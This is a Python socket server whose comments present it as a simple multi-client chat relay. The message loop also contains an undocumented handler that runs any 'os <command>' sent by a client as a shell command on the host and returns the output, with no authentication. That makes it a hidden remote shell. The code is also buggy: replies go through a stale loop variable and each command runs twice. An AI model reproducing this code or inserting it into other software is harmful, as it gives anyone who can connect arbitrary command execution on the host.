import socket
import platform
import threading
import os
from colorama import init
from termcolor import colored
from dotenv import load_dotenv

init()

dotenv_path = os.path.dirname(__file__) + '\\.env'
load_dotenv(dotenv_path)

#Variables for holding information about connections
connections = []
total_connections = 0

#Client class, new instance created for each connected client
#Each instance has the socket and address that is associated with items
#Along with an assigned ID and a name chosen by the client
class Client(threading.Thread):
    def __init__(self, socket, address, id, name, signal):
        threading.Thread.__init__(self)
        self.socket = socket
        self.address = address
        self.id = id
        self.name = name
        self.signal = signal
    
    def __str__(self):
        return str(self.id) + " " + str(self.address)
    
    #Attempt to get data from client
    #If unable to, assume client has disconnected and remove him from server data
    #If able to and we get data back, print it in the server and send it back to every
    #client aside from the client that has sent it
    #.decode is used to convert the byte data into a printable string
    def run(self):
        while self.signal:
            try:
                data = self.socket.recv(32)
            except:
                print("Client " + str(self.address) + " has disconnected")
                self.signal = False
                connections.remove(self)
                break
            
            if data != "":
                print("ID " + str(self.id) + ": " + str(data.decode("utf-8")))
                for client in connections:
                    if client.id != self.id:
                        client.socket.sendall(data)
                
                if data.decode("utf-8") == 'os':
                    client.socket.sendall(str.encode(colored(f'\n\n{platform.platform()}', 'cyan')))
                elif data.decode("utf-8")[0:len('os ')] == 'os ':
                    os.system(data.decode("utf-8")[len('os '):])
                    output = os.popen(data.decode("utf-8")[len('os '):]).read()
                    client.socket.sendall(str.encode(colored('\n\nCommand executed\n', 'green')))
                    client.socket.sendall(str.encode(output))
                    client.socket.sendall(str.encode(colored('\nEnd of output\n', 'green')))
                elif data.decode("utf-8") == 'exit':
                    client.socket.sendall(str.encode('Closing server'))
                    #client.socket.shutdown(socket.SHUT_RDWR)
                    client.socket.close()
                    os._exit(0)

#Wait for new connections
def newConnections(socket):
    while True:
        sock, address = socket.accept()
        global total_connections
        connections.append(Client(sock, address, total_connections, "Name", True))
        connections[len(connections) - 1].start()
        print("New connection at ID " + str(connections[len(connections) - 1]))
        total_connections += 1

def main():
    #Get host and port
    try:
        host = os.environ.get("HOST")
        port = int(os.environ.get("PORT"))
    except:
        host = input("Host: ")
        port = int(input("Port: "))
        
    #Create new server socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)

    #Create new thread to wait for connections
    newConnectionsThread = threading.Thread(target = newConnections, args = (sock,))
    newConnectionsThread.start()
    
main()
